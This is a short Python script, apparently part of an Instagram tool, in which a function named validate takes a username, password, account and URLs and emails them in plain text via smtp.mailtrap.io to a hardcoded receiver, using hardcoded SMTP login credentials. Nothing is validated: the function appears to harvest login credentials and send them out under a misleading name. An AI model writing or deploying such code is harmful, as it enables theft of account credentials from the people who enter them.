import smtplib
from time import sleep
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
sender = "sender@emailaddress.com"
receiver = "receiver@emailaddress.com"

#EVEN THIS IS NOT WOKRING AS EXPECTED
def update_progress(progress):
    for progress in range(1,progress):
        print("#" , end = "")
data=""    
def listToString(url):
    for datas in url:
        global data
        data+=datas+" \n  \n \n"
def validate(url,account,username,password):
    ####################################TEST MAIL WONT WORK, WORK IN PROGRESS###########################################
    listToString(url)
    message = MIMEMultipart("alternative")
    message["Subject"] = "Insta"
    message["From"] = sender
    message["To"] = receiver

    text="\n Username:  "+username+" Password  :  "+ password +" account:  "+account+" Urls:  "+data
    part1 = MIMEText(text, "plain")
    message.attach(part1)

    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login("ef8ed84fb92f25", "94ec69aec69d79")
        server.sendmail(sender, receiver, message.as_string())
    print(message)
##########################################EMAIL YOURSELF FEATURE COMING SOON!!!###############################################
    for i in range(0,50,10):
        update_progress(i)